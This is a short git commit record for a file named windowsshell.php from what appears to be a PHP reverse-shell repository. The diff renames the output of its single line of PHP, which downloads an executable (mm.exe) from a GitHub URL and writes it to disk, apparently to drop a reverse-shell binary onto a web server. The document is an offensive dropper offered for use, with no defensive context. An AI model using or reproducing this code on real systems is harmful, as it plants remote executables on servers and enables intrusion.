7e6ccce03e6b75d3560f9bd9a9c7165ea479087d
Cameron <cameronleongjj@gmail.com>
2017-10-25 00:49:42 +0800

    Update windowsshell.php

--- windowsshell.php
+++ windowsshell.php
@@ -1,3 +1,3 @@
 <?php
-file_put_contents("mm.exe", fopen("https://github.com/cameronleong/php-reverse-shell/raw/master/mm.exe", 'r'));			            
+file_put_contents("mm2.exe", fopen("https://github.com/cameronleong/php-reverse-shell/raw/master/mm.exe", 'r'));			            
 ?>
